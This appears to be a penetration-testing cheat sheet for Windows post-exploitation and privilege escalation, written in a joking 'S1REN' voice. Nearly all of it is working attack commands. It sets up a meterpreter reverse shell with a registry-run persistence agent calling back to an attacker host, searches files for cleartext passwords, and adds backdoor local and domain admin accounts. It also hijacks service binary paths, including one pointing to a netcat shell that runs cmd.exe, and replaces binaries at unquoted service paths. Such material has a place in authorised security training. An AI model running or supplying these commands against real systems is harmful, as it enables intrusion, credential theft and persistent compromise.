+ Pro-tip - To prevent your shell from hanging as a result of any of these commands, prefix them with this!
cmd.exe /c <commands>
cmd.exe /c start <commands>


+ I just got shell on windows! What would S1REN do?
--> Get a meterpreter shell.
When it comes to a windows machine and receiving a low privilege shell - I do not mess around. I will always immediately work to maintain access and gain a more useful shell with meterpreter.
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <Attacking Machine IP>
set LPORT <Listening Port>

Maintaining Access with Meterpreter:
https://www.offensive-security.com/metasploit-unleashed/maintaining-access/

meterpreter> run persistence -U -i 5 -p 443 -r <Attacking Machine IP>
[*] Creating a persistent agent: LHOST=<Attacking Machine IP> LPORT=443 (interval=5 onboot=true)
[*] Persistent agent script is 613976 bytes long
[*] Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
[*] Agent executed with PID 492
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr

+ Dude just do this with your meterpreter shell - trust S1REN.
use exploit/windows/local/service_permissions

+ Payloads
--> Checkbox target machine's file arch (x86, x64).

+ Who's the Administrator(s) around here?
net localgroup administrators

+ Might we be able to move laterally to them if they are Administrators?
net user somePotentialAdminUser

+ Firewall Information?
netsh firewall show state
netsh firewall show config

+ Network Information (who am I connected to? can anything off of Loopback be forwarded out to 0.0.0.0?)
netstat -anoy
route print
arp -A
ipconfig /all

+ Cleartext Passwords in Files? Search for them.
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

+ Find all those password and credential strings in config files.
dir /s pass == cred == vnc == .config

+ Find all passwords in all files...
findstr /spin "password" .

+ WINDOWS SHARES.
NET SHARE
NET USE

--> CREATE A SHARE ON WINDOWS FROM THE COMMAND LINE:
NET SHARE <sharename>=<drive/folderpath> /remark: "This is my share."
--> MOUNT A WINDOWS SHARE FROM THE COMMAND LINE:
NET USE Z: \\COMPUTER_NAME\SHARE_NAME /PERSISTENT:YES
--> UNMOUNT SHARE:
NET USE Z: /DELETE
--> DELETE A SHARE ENTIRLEY:
NET SHARE /DELETE

+ Find ALL weak file permissions per drive.
accesschk.exe -uwqs Users c:*.*

+ A part of group "Authenticated Users" - you would be surprised if you have a real user.
accesschk.exe -uwqs "Authenticated Users" c:*.*


+ Add an Administrator User with all of the goodies.
cmd.exe /c net user siren superPassword /add
cmd.exe /c net localgroup administrators siren /add
cmd.exe /c net localgroup "Remote Desktop Users" siren /add

+ Adding a Windows Domain Administrator from the Command Line:
cmd.exe /c net user siren superPassword /add
net localgroup Administrators siren /ADD /DOMAIN
net localgroup "Remote Desktop Users" siren /ADD /DOMAIN
net group "Domain Admins" siren /ADD /DOMAIN
net group "Enterprise Admins" siren /ADD /DOMAIN
net group "Schema Admins" siren /ADD /DOMAIN
net group "Group Policy Creator Owners" siren /ADD /DOMAIN

+ Time and our own Scheduled Tasks.
time
The current time is: 6:41:05.81
at 06:42 /interactive "C:\Tools\sirenMaint.exe"

+ Create a Task. Run as System. Every 5 minutes. Path to binary.
schtasks /create /ru SYSTEM /sc MINUTE /MO 5 /tn RUNME /tr "\"C:\Tools\sirenMaint.exe\""
Attacking Machine:
nc -lvp 443
Victim Machine:
schtasks /RUN /TN "RUNME"

+ Fun with Accesschk Enumeration!
accesschk.exe /accepteula (always do this first!!!!!)
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]

#Find ALL weak folder permissions, per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwqs Users c:*.*
accesschk.exe -uwqs "Authenticated Users" c:*.*


+ Let me guess, you came in as NT AUTHORITY\NETWORK SERVICE ?
MS09-012.exe "whoami"
Initiate Network-Related Transfer Again.
MS09-012.exe "ftp -v -n -s:ftp.txt" and come back in NT Shell.


+ I enumerated a weak service path on the machine. How do I exploit this... S1REN?
sc config UPNPHOST binpath= "C:\Tools\sirenMaint.exe"
sc config UPNPHOST obj= ".\LocalSystem" password= ""
sc config SSDPSRV binpath= "C:\inetpub\siren\sirenMaint.exe"
sc config SSDPSRV obj= ".\LocalSystem" password= ""
sc config SSDPSRV start= "demand"
(Now, Stage matching msfvenom Payload Listener in Meterpreter)
net stop SSDPSRV
net start SSDPSRV

+ Up to Vista...
psexec -i -s cmd.exe

+ On Windows XP and Older we can get an Administrator Privilege shell.

--> IF you have a GUI with a USER THAT IS INCLUDED IN THE Administrators GROUP you first
need to open up cmd.exe for the administrator. If you open up the cmd that is in
Accessories it will be opened up as a normal user. And if you rightclick and do
Run as Administrator you might need to know the Administrators password. Which
you might not know. So instead you open up the cmd from C:\windows\system32\cmd.exe.
This will give you a cmd with Administrators Rights.

--> From here, we want SYSTEM level privileges, no?
--> First we check what time it is on the local machine.
time
--> Now we set the time we want the system CMD to start.
--> Probably one minuter after the time.
at 01:23 /interactive cmd.exe
System Shell.

+ Ahh, so you're interested in UNQUOTED SERVICE PATHS... eh?
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\" |findstr /i /v """

--> Using SC:
sc query
sc qc <service name>

--> Okay S1REN, what am I looking for here?
If the results of the above command's value of path only contains "" and spaces - it's vulnerable.

--> Have a hit?
--> Use icacls or cacls.exe (both native to Windows) to check binary permissions.
icacls "C:\Program Files (x86)\UNQUOTED_SERVICE_PATH_SOFTWARE"

--> Exploit it.
--> If the path of the Binary file is:
C:\Program Files\something\something.exe
--> Then,
move something.exe something.exe.BACK
move sirenMaint.exe C:\Program Files\something\
move sirenMaint.exe something.exe

--> Well, wasn't that fun? Now our payload will get executed instead of the intended exe!
--> Nice.

#S1REN, is there a better way to enumerate out every service and then just check for which of them has an Unquoted Bin Paths?
--> Yup.
--> Thanks S1REN!
cd "C:\Windows\TEMP"
sc query state= all | findstr "SERVICE_NAME:" >> ServiceNames.txt
FOR /F %i in (ServiceNames.txt) DO echo %i
type ServiceNames.txt
FOR /F "tokens=2 delims= " %i in (ServiceNames.txt) DO @echo %i >> Services.txt
FOR /F %i in (Services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
type path.txt

Nice.

#Continued
--> S1REN.
--> Yes?
--> Is there a way to do essentially the same thing and then recursively execute icacls.exe or cacls.exe on them to get the information I need?
--> Yup.
cd "C:\Windows\TEMP\"
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> C:\windows\temp\permissions.txt

icacls.exe:
for /f eol^=^"^ delims^=^" %a in (C:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

cacls.exe
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c cacls "%a"

IF YOU FIND A SERVICE THAT HAS WRITE PERMISSIONS set to "EVERYONE", you can change
that binary INTO YOUR OWN CUSTOM BINARY and make it execute in the privileged context.

+ Dealing with Scheduled Tasks with SYSTEM Privileges.
--> Here we are looking for tasks that are run by a privileged user, and run a binary
that we can overwrite.
schtasks /query /fo LIST /v > schtask.txt
type schtask.txt
(Copy that output to a temporary file

--> Yeah I know this ain't pretty, but it works. You can of course change the name
SYSTEM to another privileged user. In other words, copy the output into Kali and
just grep for SYSTEM.
--> Nice, S1REN.
--> Thanks.
cat schtask.txt | grep "SYSTEM|Task To Run" | grep -B 1 SYSTEM --color=auto

--> Now, Change up the UPNP Service Binary Path (for example):
sc config upnphost binpath= "C:\Tools\nc.exe -nlvp 6666 -e C:\Windows\system32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
net stop <service>
--> Attacking Machine
nc -nlvp 6666
net start <service>

+ How do I cross-compile payloads for Windows on Linux, S1REN?
--> Dude, check this out.
apt-get install mingw-w64

+ Cross-Compilation Reference:
# Ci686-w64-mingw32-gcc hello.c -o hello32.exe     
# 32-bitx86_64-w64-mingw32-gcc hello.c -o hello64.exe
